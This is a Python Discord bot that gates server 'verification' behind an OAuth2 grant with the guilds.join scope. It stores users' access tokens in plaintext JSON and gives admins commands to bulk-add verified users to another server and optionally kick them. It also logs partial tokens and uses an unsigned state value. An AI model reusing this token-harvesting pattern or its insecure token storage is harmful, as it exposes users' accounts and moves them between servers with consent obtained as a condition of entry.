import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
import aiohttp
from typing import Optional
import asyncio
import json
from datetime import datetime

# ----------------------------
# RENDER-SPECIFIC CONFIGURATION
# ----------------------------
# Render provides PORT via environment variable
PORT = int(os.getenv("PORT", 3000))

# Load environment variables from Render
load_dotenv()  # This will work with Render's environment variables

def get_env_int(name: str) -> int:
    value = os.getenv(name)
    if value is None:
        raise ValueError(f"Environment variable {name} not set!")
    try:
        return int(value)
    except ValueError:
        raise ValueError(f"Environment variable {name} must be number, got '{value}'")

def get_env_bool(name: str, default: bool = False) -> bool:
    value = os.getenv(name)
    if value is None:
        return default
    return value.lower() in ('true', 'yes', '1', 'y')

# Load environment variables
TOKEN = os.getenv("TOKEN")
if TOKEN is None:
    raise ValueError("TOKEN not set in environment variables!")

GUILD_ID = get_env_int("GUILD_ID")
UNVERIFIED_ROLE_ID = get_env_int("UNVERIFIED_ROLE_ID")
VERIFIED_ROLE_ID = get_env_int("VERIFIED_ROLE_ID")
VERIFY_CHANNEL_ID = get_env_int("LOG_CHANNEL_ID")

# OAuth2 variables
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
# CRITICAL: This must be your Render URL after deployment
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://your-bot-name.onrender.com/callback")

# Target server for OAuth2 redirection
TARGET_SERVER_ID = get_env_int("TARGET_SERVER_ID")

# Auto-kick after successful OAuth2 add (optional)
AUTO_KICK_AFTER_ADD = get_env_bool("AUTO_KICK_AFTER_ADD", False)

# File to store tokens and pending verifications
TOKENS_FILE = "user_tokens.json"
PENDING_FILE = "pending_verifications.json"
OAUTH2_ADDS_FILE = "oauth2_adds_log.json"

# Load stored data
def load_json_file(filename, default={}):
    if os.path.exists(filename):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"❌ Error loading {filename}: {e}")
            return default
    return default

def save_json_file(filename, data):
    try:
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"❌ Error saving {filename}: {e}")

user_access_tokens = load_json_file(TOKENS_FILE)
pending_verifications = load_json_file(PENDING_FILE)
oauth2_adds_log = load_json_file(OAUTH2_ADDS_FILE)

# ----------------------------
# Bot setup
# ----------------------------
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.guilds = True

print("="*60)
print("🤖 DISCORD OAUTH2 REDIRECTION BOT - RENDER EDITION")
print("="*60)
print(f"✅ Bot starting on port: {PORT}")
print(f"🌐 Callback URL: {REDIRECT_URI}")
print(f"🔧 Client ID: {CLIENT_ID}")
print(f"🎯 Target Server ID: {TARGET_SERVER_ID}")
print(f"🔑 Users with tokens: {len(user_access_tokens)}")
print(f"⏳ Pending verifications: {len(pending_verifications)}")

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ----------------------------
# OAuth2 Helper Functions
# ----------------------------
async def exchange_code_for_token(code: str) -> Optional[dict]:
    """Exchange OAuth2 code for access token"""
    try:
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        async with aiohttp.ClientSession() as session:
            async with session.post('https://discord.com/api/oauth2/token', data=data, headers=headers) as resp:
                print(f"🔑 Token exchange status: {resp.status}")
                if resp.status == 200:
                    token_data = await resp.json()
                    print(f"✅ Token received: {token_data.get('access_token', '')[:20]}...")
                    return token_data
                else:
                    error_text = await resp.text()
                    print(f"❌ Token exchange failed: {resp.status} - {error_text}")
    except Exception as e:
        print(f"❌ Token exchange error: {e}")
    return None

async def get_user_info(access_token: str) -> Optional[dict]:
    """Get user info using access token"""
    try:
        headers = {'Authorization': f'Bearer {access_token}'}
        
        async with aiohttp.ClientSession() as session:
            async with session.get('https://discord.com/api/users/@me', headers=headers) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    print(f"❌ User info failed: {resp.status}")
    except Exception as e:
        print(f"❌ User info error: {e}")
    return None

async def add_user_to_guild_via_oauth2(user_id: str, access_token: str, guild_id: int) -> bool:
    """
    DIRECT OAuth2 REDIRECTION: Add user to a guild using OAuth2 guilds.join scope
    """
    try:
        headers = {
            'Authorization': f'Bot {TOKEN}',
            'Content-Type': 'application/json'
        }
        
        data = {'access_token': access_token}
        
        print(f"\n🔄 OAuth2 Adding user {user_id} to guild {guild_id}")
        print(f"📝 Using token: {access_token[:30]}...")
        
        async with aiohttp.ClientSession() as session:
            async with session.put(
                f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}',
                headers=headers,
                json=data
            ) as resp:
                
                status = resp.status
                response_text = await resp.text()
                
                print(f"📡 Response status: {status}")
                
                if status in [200, 201]:  # Success - user added
                    print(f"✅ OAuth2 ADD SUCCESS: User {user_id} added to guild {guild_id}")
                    
                    # Log the successful add
                    if user_id not in oauth2_adds_log:
                        oauth2_adds_log[user_id] = []
                    oauth2_adds_log[user_id].append({
                        "timestamp": datetime.utcnow().isoformat(),
                        "guild_id": guild_id,
                        "method": "oauth2_guilds_join"
                    })
                    save_json_file(OAUTH2_ADDS_FILE, oauth2_adds_log)
                    
                    return True
                    
                elif status == 204:  # User already in guild
                    print(f"⚠️ User {user_id} already in guild {guild_id}")
                    
                    # Still log as success
                    if user_id not in oauth2_adds_log:
                        oauth2_adds_log[user_id] = []
                    oauth2_adds_log[user_id].append({
                        "timestamp": datetime.utcnow().isoformat(),
                        "guild_id": guild_id,
                        "method": "already_member"
                    })
                    save_json_file(OAUTH2_ADDS_FILE, oauth2_adds_log)
                    
                    return True
                    
                elif status == 403:  # Forbidden
                    print(f"❌ OAuth2 ADD FAILED: Bot lacks permissions")
                    print(f"   Response: {response_text}")
                    return False
                    
                else:  # Other error
                    print(f"❌ OAuth2 ADD FAILED: Status {status} - {response_text}")
                    return False
                    
    except Exception as e:
        print(f"❌ OAuth2 guild add error: {e}")
        import traceback
        traceback.print_exc()
    return False

async def verify_user_in_guild(user_id: int, guild_id: int):
    """Give verified role to user in specific guild"""
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"❌ Guild {guild_id} not found")
        return False
    
    member = guild.get_member(user_id)
    if not member:
        print(f"❌ User {user_id} not in guild {guild_id}")
        return False
    
    verified_role = guild.get_role(VERIFIED_ROLE_ID)
    unverified_role = guild.get_role(UNVERIFIED_ROLE_ID)
    
    if not verified_role:
        print(f"❌ Verified role not found in guild {guild_id}")
        return False
    
    try:
        # Remove unverified role if present
        if unverified_role and unverified_role in member.roles:
            await member.remove_roles(unverified_role)
        
        # Add verified role
        await member.add_roles(verified_role)
        print(f"✅ Verified {member.name} ({member.id}) in guild {guild.name}")
        return True
    except Exception as e:
        print(f"❌ Failed to verify {member.name}: {e}")
        return False

# ----------------------------
# Verification Button
# ----------------------------
class StartVerifyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Start Verification", style=discord.ButtonStyle.green, custom_id="start_verify")
    async def start_verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        member = interaction.user
        guild = interaction.guild
        
        print(f"\n🔔 Verification button clicked by {member.name} ({member.id})")
        
        # Check if already verified
        verified_role = guild.get_role(VERIFIED_ROLE_ID)
        if verified_role and verified_role in member.roles:
            return await interaction.response.send_message(
                "✅ You're already verified!", ephemeral=True
            )
        
        # Check if already has unverified role
        unverified_role = guild.get_role(UNVERIFIED_ROLE_ID)
        if not unverified_role:
            return await interaction.response.send_message(
                "❌ Server not configured properly!", ephemeral=True
            )
        
        # Give unverified role if not already
        if unverified_role not in member.roles:
            try:
                await member.add_roles(unverified_role)
            except Exception as e:
                print(f"❌ Cannot assign roles: {e}")
                return await interaction.response.send_message(
                    "❌ Cannot assign roles!", ephemeral=True
                )
        
        # Create OAuth2 URL with guilds.join scope
        state_data = f"{member.id}:{guild.id}"
        oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify+guilds.join&state={state_data}"
        
        # Store pending verification
        pending_verifications[str(member.id)] = guild.id
        save_json_file(PENDING_FILE, pending_verifications)
        
        print(f"📝 Stored pending verification for {member.id} in guild {guild.id}")
        
        # Send DM with authorization link
        embed = discord.Embed(
            title="🔐 Complete Verification",
            description=(
                "**Click below to verify and authorize server access:**\n\n"
                "**Required Permissions:**\n"
                "• Access your username and avatar\n"
                "• **Join servers for you** (for automated transfers)\n\n"
                "**After authorization:**\n"
                "1. You'll get the Verified role\n"
                "2. Admins can move you to other servers instantly\n\n"
                f"[Click to Authorize & Verify]({oauth_url})"
            ),
            color=discord.Color.blue()
        )
        embed.set_footer(text="Verification happens AFTER authorization")
        
        try:
            await member.send(embed=embed)
            print(f"📨 DM sent to {member.name}")
            await interaction.response.send_message(
                "📩 Check your DMs to complete verification!", ephemeral=True
            )
        except Exception as e:
            print(f"❌ Could not send DM: {e}")
            await interaction.response.send_message(
                f"{member.mention}, please enable DMs to complete verification!",
                ephemeral=True
            )

# ----------------------------
# Auto-complete verification after OAuth2
# ----------------------------
async def complete_verification(user_id: int, access_token: str):
    """Complete verification after OAuth2 authorization"""
    print(f"\n🔄 [VERIFICATION] Starting verification for user {user_id}")
    
    # Get user info
    user_info = await get_user_info(access_token)
    if not user_info:
        print(f"❌ [VERIFICATION] Failed to get user info for {user_id}")
        return False
    
    username = user_info.get('username', 'Unknown')
    user_id_from_token = user_info.get('id')
    
    print(f"🔄 [VERIFICATION] Got user info: {username} (ID from token: {user_id_from_token})")
    
    # Ensure user IDs match
    if str(user_id) != str(user_id_from_token):
        print(f"⚠️ [VERIFICATION] User ID mismatch! Expected {user_id}, got {user_id_from_token}")
        user_id = int(user_id_from_token)
    
    # Check if this user has a pending verification
    user_id_str = str(user_id)
    
    if user_id_str in pending_verifications:
        print(f"✅ [VERIFICATION] User has pending verification")
        guild_id = pending_verifications[user_id_str]
        
        # Verify user in that guild
        success = await verify_user_in_guild(user_id, guild_id)
        
        if success:
            # Remove from pending
            del pending_verifications[user_id_str]
            save_json_file(PENDING_FILE, pending_verifications)
            
            # Store token FOR OAuth2 REDIRECTION
            user_access_tokens[user_id_str] = access_token
            save_json_file(TOKENS_FILE, user_access_tokens)
            
            print(f"✅ [VERIFICATION] Verification completed for {username}")
            print(f"✅ [VERIFICATION] Token stored: {access_token[:20]}...")
            return True
        else:
            print(f"❌ [VERIFICATION] Failed to verify {username} in guild")
    else:
        print(f"⚠️ [VERIFICATION] No pending verification for {username}, storing token only")
        # Store token anyway for future OAuth2 redirection
        user_access_tokens[user_id_str] = access_token
        save_json_file(TOKENS_FILE, user_access_tokens)
        print(f"✅ [VERIFICATION] Token stored anyway: {access_token[:20]}...")
    
    return False

# ----------------------------
# Bot Commands
# ----------------------------
@bot.command(name="ping")
async def ping_command(ctx):
    """Check bot status"""
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! {latency}ms")

@bot.command(name="verify")
async def verify_command(ctx):
    """Manual verification command"""
    member = ctx.author
    guild = ctx.guild
    
    print(f"\n🔔 !verify command used by {member.name} ({member.id})")
    
    # Check if already verified
    verified_role = guild.get_role(VERIFIED_ROLE_ID)
    if verified_role and verified_role in member.roles:
        return await ctx.send("✅ You're already verified!")
    
    # Create OAuth2 URL WITH guilds.join scope
    state_data = f"{member.id}:{guild.id}"
    oauth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify+guilds.join&state={state_data}"
    
    # Store pending
    pending_verifications[str(member.id)] = guild.id
    save_json_file(PENDING_FILE, pending_verifications)
    
    embed = discord.Embed(
        title="🔐 Complete Verification",
        description=f"[Click here to verify and authorize]({oauth_url})\n\n**Includes 'Join servers for you' permission for automated transfers.**",
        color=discord.Color.blue()
    )
    
    try:
        await member.send(embed=embed)
        await ctx.send(f"📩 {member.mention}, check DMs to verify!")
    except:
        await ctx.send(f"{member.mention}, enable DMs to verify!")

@bot.command(name="add", aliases=["redirect", "move"])
@commands.has_permissions(administrator=True)
async def add_user_command(ctx, member: discord.Member):
    """
    DIRECT OAuth2 REDIRECTION: Add verified user to target server
    """
    print(f"\n🔔 !add command for {member.name} ({member.id})")
    
    # Check if user is verified
    verified_role = ctx.guild.get_role(VERIFIED_ROLE_ID)
    if not verified_role:
        return await ctx.send("❌ Verified role not found!")
    
    if verified_role not in member.roles:
        return await ctx.send(f"❌ {member.mention} is not verified! Use `!verify` first.")
    
    # Check if user has authorized with guilds.join scope
    user_id_str = str(member.id)
    if user_id_str not in user_access_tokens:
        return await ctx.send(
            f"❌ {member.mention} hasn't completed OAuth2 authorization!\n"
            f"They need to use `!verify` or the verification button and grant **'Join servers for you'** permission."
        )
    
    access_token = user_access_tokens[user_id_str]
    print(f"🔑 Found token for user {member.id}: {access_token[:30]}...")
    
    status_msg = await ctx.send(f"🔄 **OAuth2 Redirection:** Adding {member.mention} to target server...")
    
    # Perform OAuth2 guild add
    success = await add_user_to_guild_via_oauth2(user_id_str, access_token, TARGET_SERVER_ID)
    
    if success:
        response = f"✅ **OAuth2 ADD SUCCESS:** {member.mention} has been added to the target server!"
        
        # Optional: Auto-kick after successful add
        if AUTO_KICK_AFTER_ADD:
            try:
                await member.kick(reason="OAuth2 redirection to target server completed")
                response += f"\n🚪 User has been kicked from this server."
            except discord.Forbidden:
                response += f"\n⚠️ Could not kick user (insufficient permissions)."
        
        await status_msg.edit(content=response)
        
        # Try to notify user
        try:
            target_guild = bot.get_guild(TARGET_SERVER_ID)
            server_name = target_guild.name if target_guild else "the target server"
            await member.send(f"✅ **Server Transfer Complete:** You've been added to **{server_name}** via OAuth2.")
        except:
            pass
            
    else:
        await status_msg.edit(content=f"❌ **OAuth2 ADD FAILED:** Could not add {member.mention} to target server.\nBot may lack 'guilds.join' scope or user revoked permissions.")

@bot.command(name="addall", aliases=["redirectall", "moveall"])
@commands.has_permissions(administrator=True)
async def add_all_command(ctx):
    """OAuth2 add ALL verified users to target server"""
    
    verified_role = ctx.guild.get_role(VERIFIED_ROLE_ID)
    if not verified_role:
        return await ctx.send("❌ Verified role not found!")
    
    verified_members = [m for m in verified_role.members if str(m.id) in user_access_tokens]
    
    if not verified_members:
        return await ctx.send("❌ No verified users with OAuth2 tokens found!")
    
    status_msg = await ctx.send(f"🔄 **Batch OAuth2 Redirection:** Starting... ({len(verified_members)} users)")
    
    success_count = 0
    fail_count = 0
    no_token_count = 0
    
    for i, member in enumerate(verified_members):
        user_id_str = str(member.id)
        access_token = user_access_tokens.get(user_id_str)
        
        if not access_token:
            no_token_count += 1
            continue
        
        # Update status every 3 users
        if i % 3 == 0:
            await status_msg.edit(content=f"🔄 **Batch OAuth2:** Processing {i+1}/{len(verified_members)}...")
        
        success = await add_user_to_guild_via_oauth2(user_id_str, access_token, TARGET_SERVER_ID)
        
        if success:
            success_count += 1
            
            # Optional kick
            if AUTO_KICK_AFTER_ADD:
                try:
                    await member.kick(reason="Batch OAuth2 redirection")
                except:
                    pass
        else:
            fail_count += 1
        
        # Rate limiting delay
        await asyncio.sleep(1.5)
    
    # Final report
    report = (
        f"📊 **Batch OAuth2 Redirection Complete**\n"
        f"✅ Success: **{success_count}** users added\n"
        f"❌ Failed: **{fail_count}** users\n"
        f"⚠️ No token: **{no_token_count}** users"
    )
    
    await status_msg.edit(content=report)

@bot.command(name="force_verify")
@commands.has_permissions(administrator=True)
async def force_verify_command(ctx, member: discord.Member):
    """Force verify a user (admin only)"""
    
    verified_role = ctx.guild.get_role(VERIFIED_ROLE_ID)
    unverified_role = ctx.guild.get_role(UNVERIFIED_ROLE_ID)
    
    if not verified_role:
        return await ctx.send("❌ Verified role not found!")
    
    try:
        # Remove unverified if present
        if unverified_role and unverified_role in member.roles:
            await member.remove_roles(unverified_role)
        
        # Add verified
        await member.add_roles(verified_role)
        await ctx.send(f"✅ **{member.display_name}** force-verified!")
    except Exception as e:
        await ctx.send(f"❌ Failed: {e}")

@bot.command(name="check_pending")
@commands.has_permissions(administrator=True)
async def check_pending_command(ctx):
    """Check pending verifications"""
    
    if not pending_verifications:
        return await ctx.send("✅ No pending verifications.")
    
    embed = discord.Embed(
        title="⏳ Pending OAuth2 Authorizations",
        description=f"Total: {len(pending_verifications)}",
        color=discord.Color.orange()
    )
    
    for user_id_str, guild_id in list(pending_verifications.items())[:10]:
        member = ctx.guild.get_member(int(user_id_str))
        if member:
            embed.add_field(
                name=member.display_name,
                value=f"Waiting for OAuth2 with 'guilds.join'",
                inline=True
            )
    
    await ctx.send(embed=embed)

@bot.command(name="checkauth")
@commands.has_permissions(administrator=True)
async def check_auth_command(ctx):
    """Check users with OAuth2 tokens (can be redirected)"""
    
    if not user_access_tokens:
        return await ctx.send("❌ No OAuth2 authorizations yet.")
    
    authorized_in_guild = []
    for user_id_str in user_access_tokens.keys():
        member = ctx.guild.get_member(int(user_id_str))
        if member:
            authorized_in_guild.append(member.mention)
    
    if not authorized_in_guild:
        return await ctx.send("❌ No authorized users in this server.")
    
    embed = discord.Embed(
        title="✅ Users Ready for OAuth2 Redirection",
        description=f"**Total with 'guilds.join' tokens:** {len(authorized_in_guild)}\n" + "\n".join(authorized_in_guild[:15]),
        color=discord.Color.green()
    )
    embed.set_footer(text="These users can be added to target server with !add @user")
    
    await ctx.send(embed=embed)

@bot.command(name="tokenstatus")
@commands.has_permissions(administrator=True)
async def token_status_command(ctx, member: Optional[discord.Member] = None):
    """Check if a user has OAuth2 token for redirection"""
    
    if member:
        has_token = str(member.id) in user_access_tokens
        token_count = len(oauth2_adds_log.get(str(member.id), []))
        
        embed = discord.Embed(
            title=f"🔑 OAuth2 Token Status: {member.display_name}",
            color=discord.Color.green() if has_token else discord.Color.red()
        )
        embed.add_field(name="Has 'guilds.join' Token", value="✅ Yes" if has_token else "❌ No", inline=True)
        embed.add_field(name="Successful Redirects", value=f"{token_count}", inline=True)
        
        if has_token:
            embed.add_field(name="Can Use", value=f"`!add @{member.name}`", inline=False)
        
        await ctx.send(embed=embed)
    else:
        # Show overall stats
        total_tokens = len(user_access_tokens)
        total_adds = sum(len(v) for v in oauth2_adds_log.values())
        unique_redirected = len(oauth2_adds_log)
        
        embed = discord.Embed(
            title="📊 OAuth2 Redirection System Status",
            color=discord.Color.blue()
        )
        embed.add_field(name="Users with Tokens", value=f"{total_tokens}", inline=True)
        embed.add_field(name="Total Redirects", value=f"{total_adds}", inline=True)
        embed.add_field(name="Unique Users Redirected", value=f"{unique_redirected}", inline=True)
        
        await ctx.send(embed=embed)

@bot.command(name="debug_token")
@commands.has_permissions(administrator=True)
async def debug_token_command(ctx, member: discord.Member):
    """Debug token storage for a specific user"""
    user_id_str = str(member.id)
    
    # Check all possible locations
    has_token = user_id_str in user_access_tokens
    is_pending = user_id_str in pending_verifications
    
    embed = discord.Embed(title="🔍 Token Debug", color=discord.Color.orange())
    embed.add_field(name="User", value=f"{member.mention}\nID: {member.id}", inline=False)
    embed.add_field(name="Has Token", value="✅ Yes" if has_token else "❌ No", inline=True)
    embed.add_field(name="Is Pending", value="✅ Yes" if is_pending else "❌ No", inline=True)
    
    if has_token:
        token = user_access_tokens[user_id_str]
        embed.add_field(name="Token", value=f"`{token[:30]}...`", inline=False)
        embed.add_field(name="Token Length", value=str(len(token)), inline=True)
    
    if is_pending:
        guild_id = pending_verifications[user_id_str]
        embed.add_field(name="Pending Guild", value=guild_id, inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name="check_perms")
@commands.has_permissions(administrator=True)
async def check_perms_command(ctx):
    """Check bot permissions in target server"""
    target_guild = bot.get_guild(TARGET_SERVER_ID)
    if not target_guild:
        await ctx.send("❌ Bot not in target server!")
        return
    
    bot_member = target_guild.get_member(bot.user.id)
    if not bot_member:
        await ctx.send("❌ Bot member not found in target server!")
        return
    
    perms = bot_member.guild_permissions
    
    embed = discord.Embed(title="🔧 Bot Permissions Check", color=discord.Color.blue())
    embed.add_field(name="Target Server", value=target_guild.name, inline=True)
    embed.add_field(name="Bot Name", value=bot_member.name, inline=True)
    embed.add_field(name="Manage Server", value="✅" if perms.manage_guild else "❌", inline=True)
    embed.add_field(name="Create Invite", value="✅" if perms.create_instant_invite else "❌", inline=True)
    embed.add_field(name="Manage Roles", value="✅" if perms.manage_roles else "❌", inline=True)
    embed.add_field(name="Administrator", value="✅" if perms.administrator else "❌", inline=True)
    embed.add_field(name="Kick Members", value="✅" if perms.kick_members else "❌", inline=True)
    
    await ctx.send(embed=embed)

@bot.command(name="commands")
async def commands_list(ctx):
    """Show available commands"""
    
    embed = discord.Embed(
        title="🤖 OAuth2 Redirection Bot Commands",
        description="**User Commands:**\n• Click 'Start Verification' button\n• `!verify` - Start OAuth2 verification\n\n**Admin Commands:**",
        color=discord.Color.blue()
    )
    
    admin_cmds = [
        ("`!add @user`", "**PRIMARY:** OAuth2 add user to target server (aliases: !redirect, !move)"),
        ("`!addall`", "OAuth2 add ALL verified users to target server"),
        ("`!force_verify @user`", "Force verify user (no OAuth2)"),
        ("`!checkauth`", "See users with OAuth2 tokens"),
        ("`!tokenstatus [@user]`", "Check token/redirect status"),
        ("`!check_pending`", "See pending OAuth2 authorizations"),
        ("`!debug_token @user`", "Debug token storage for user"),
        ("`!check_perms`", "Check bot permissions in target server"),
        ("`!ping`", "Check bot latency"),
        ("`!commands`", "This menu")
    ]
    
    for cmd, desc in admin_cmds:
        embed.add_field(name=cmd, value=desc, inline=False)
    
    embed.set_footer(text="Uses OAuth2 'guilds.join' scope for direct server adds")
    
    await ctx.send(embed=embed)

# ----------------------------
# Bot Events
# ----------------------------
@bot.event
async def on_member_join(member: discord.Member):
    """Auto assign unverified role"""
    unverified_role = member.guild.get_role(UNVERIFIED_ROLE_ID)
    if unverified_role:
        try:
            await member.add_roles(unverified_role)
        except:
            pass

@bot.event
async def on_ready():
    print(f"\n{'='*60}")
    print(f"✅ OAuth2 Redirection Bot ready: {bot.user.name}")
    print(f"📋 Bot ID: {bot.user.id}")
    print(f"✅ Verification Server: {GUILD_ID}")
    print(f"🎯 Target Server ID: {TARGET_SERVER_ID}")
    print(f"🔑 Users with 'guilds.join' tokens: {len(user_access_tokens)}")
    print(f"⏳ Pending OAuth2 auths: {len(pending_verifications)}")
    print(f"📨 Successful OAuth2 adds: {sum(len(v) for v in oauth2_adds_log.values())}")
    print(f"🔄 Auto-kick after add: {AUTO_KICK_AFTER_ADD}")
    print(f"🌐 Callback URL: {REDIRECT_URI}")
    print(f"🚀 Running on port: {PORT}")
    print(f"{'='*60}\n")
    
    bot.add_view(StartVerifyButton())
    await post_verification_message()

async def post_verification_message():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print("❌ Guild not found!")
        return
    
    verify_channel = guild.get_channel(VERIFY_CHANNEL_ID)
    if not verify_channel:
        print("❌ Channel not found!")
        return
    
    # Check if message exists
    try:
        async for message in verify_channel.history(limit=20):
            if message.author == bot.user and message.components:
                print("✅ Verification message exists")
                return
    except:
        pass
    
    # Send new message
    embed = discord.Embed(
        title="🔐 OAuth2 Server Verification",
        description=(
            "**Click below to verify and authorize automated transfers:**\n\n"
            "**Required Permission:**\n"
            "• **Join servers for you** (for instant admin-controlled transfers)\n\n"
            "**Process:**\n"
            "1. Click 'Start Verification'\n"
            "2. Authorize with Discord (grant 'Join servers for you')\n"
            "3. Get Verified role automatically\n"
            "4. Admins can instantly add you to other servers\n\n"
            "*No invite links needed - direct OAuth2 server joins*"
        ),
        color=discord.Color.green()
    )
    
    try:
        await verify_channel.send(embed=embed, view=StartVerifyButton())
        print("✅ OAuth2 verification message sent")
    except Exception as e:
        print(f"❌ Message send failed: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("❌ Unknown command! Use `!commands`")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Admin only!")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing: `{ctx.command.signature}`")
    else:
        print(f"Command error: {error}")

# ----------------------------
# RENDER-COMPATIBLE Callback Server
# ----------------------------
async def run_callback_server():
    """HTTP server to handle OAuth2 callbacks - Render compatible"""
    from aiohttp import web
    
    async def handle_callback(request):
        print(f"\n{'='*60}")
        print("📥 OAuth2 Callback Received!")
        
        code = request.query.get('code')
        state = request.query.get('state')
        
        print(f"📝 Code present: {'Yes' if code else 'No'}")
        print(f"📝 State: {state}")
        
        if not code:
            print("❌ No code received")
            return web.Response(text="❌ No authorization code received")
        
        # Exchange code for token
        print("🔄 Exchanging code for token...")
        token_data = await exchange_code_for_token(code)
        
        if not token_data or 'access_token' not in token_data:
            print("❌ Token exchange failed")
            return web.Response(text="❌ Token exchange failed")
        
        access_token = token_data['access_token']
        print(f"✅ Token received: {access_token[:30]}...")
        
        # Parse state to get user_id
        user_id = None
        guild_id = None
        
        if state and ':' in state:
            try:
                user_id_str, guild_id_str = state.split(':')
                user_id = int(user_id_str)
                guild_id = int(guild_id_str)
                print(f"✅ Parsed state: User {user_id}, Guild {guild_id}")
            except Exception as e:
                print(f"⚠️ Could not parse state: {e}")
        
        # If no state, get user info from token
        if not user_id:
            print("🔄 Getting user info from token...")
            user_info = await get_user_info(access_token)
            if user_info:
                user_id = int(user_info.get('id'))
                print(f"✅ Got user ID from token: {user_id}")
        
        if user_id:
            # Complete verification AND store token for OAuth2 redirection
            print(f"🔄 Completing verification for user {user_id}...")
            await complete_verification(user_id, access_token)
        else:
            print("❌ Could not determine user ID")
        
        # Success page
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>✅ OAuth2 Authorization Complete</title>
            <style>
                body { 
                    text-align: center; 
                    padding: 50px; 
                    font-family: Arial; 
                    background: linear-gradient(135deg, #43b581 0%, #3ca374 100%);
                    color: white;
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    padding: 40px;
                    border-radius: 20px;
                    backdrop-filter: blur(10px);
                    max-width: 600px;
                    width: 90%;
                    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                }
                .success-icon {
                    font-size: 60px; 
                    margin: 20px 0;
                }
                h1 {
                    font-size: 2.5em; 
                    margin: 20px 0;
                    color: white;
                }
                p {
                    font-size: 1.2em;
                    line-height: 1.6;
                    margin: 15px 0;
                }
                .checklist {
                    text-align: left;
                    display: inline-block;
                    margin: 20px;
                    background: rgba(0,0,0,0.2);
                    padding: 20px;
                    border-radius: 10px;
                    width: 80%;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="success-icon">✅</div>
                <h1>OAuth2 Authorization Complete!</h1>
                <p>You have successfully granted <b>'Join servers for you'</b> permission.</p>
                
                <div class="checklist">
                    <p><b>✅ What happens next:</b></p>
                    <p>• You'll receive the Verified role (if pending)</p>
                    <p>• Admins can now add you to other servers instantly</p>
                    <p>• You may return to Discord</p>
                </div>
                
                <p style="margin-top: 30px; font-size: 0.9em;">
                    This window will close automatically in 5 seconds...
                </p>
            </div>
            
            <script>
                // Auto-close after 5 seconds
                setTimeout(() => {
                    window.close();
                }, 5000);
                
                // Try to notify Discord
                try {
                    if (window.opener) {
                        window.opener.postMessage('oauth2_complete', '*');
                    }
                } catch(e) {
                    console.log('Could not notify opener');
                }
            </script>
        </body>
        </html>
        """
        
        return web.Response(text=html, content_type='text/html')
    
    # Create web application
    app = web.Application()
    app.router.add_get('/callback', handle_callback)
    
    # Add health check endpoint (REQUIRED for Render monitoring)
    async def health_check(request):
        return web.Response(text="OK", status=200)
    
    app.router.add_get('/health', health_check)
    app.router.add_get('/', health_check)  # Root also responds
    
    # Setup and start server
    runner = web.AppRunner(app)
    await runner.setup()
    
    # CRITICAL FOR RENDER: Bind to 0.0.0.0 (all network interfaces)
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    
    try:
        await site.start()
        print(f"🌐 OAuth2 callback server running on port {PORT}")
        print(f"🌐 Accessible at: http://0.0.0.0:{PORT}/callback")
        print(f"🩺 Health check at: http://0.0.0.0:{PORT}/health")
        return runner
    except OSError as e:
        print(f"❌ Port {PORT} error: {e}")
        raise

# ----------------------------
# Main Function - Render Compatible
# ----------------------------
async def main():
    """Start both bot and callback server for Render"""
    print("\n🚀 Starting OAuth2 Redirection Bot on Render...")
    print("📌 Uses 'guilds.join' scope for direct server additions")
    print(f"🎯 Target server: {TARGET_SERVER_ID}")
    print(f"🔄 Auto-kick after OAuth2 add: {AUTO_KICK_AFTER_ADD}")
    print(f"🌐 Callback URL: {REDIRECT_URI}")
    print(f"🔧 Client ID: {CLIENT_ID}")
    
    # Verify configuration
    if not all([TOKEN, CLIENT_ID, CLIENT_SECRET]):
        print("❌ Missing required environment variables!")
        print("❌ Check Render environment variables: TOKEN, CLIENT_ID, CLIENT_SECRET")
        return
    
    # Start callback server in background
    runner = None
    try:
        runner = await run_callback_server()
        print("✅ Callback server started successfully")
    except Exception as e:
        print(f"❌ Failed to start callback server: {e}")
        print("💡 Make sure PORT environment variable is set by Render")
        return
    
    # Start bot
    try:
        print("\n🤖 Starting Discord bot...")
        await bot.start(TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid bot token! Check TOKEN environment variable")
    except Exception as e:
        print(f"❌ Bot failed to start: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup
        if runner:
            await runner.cleanup()
        await bot.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
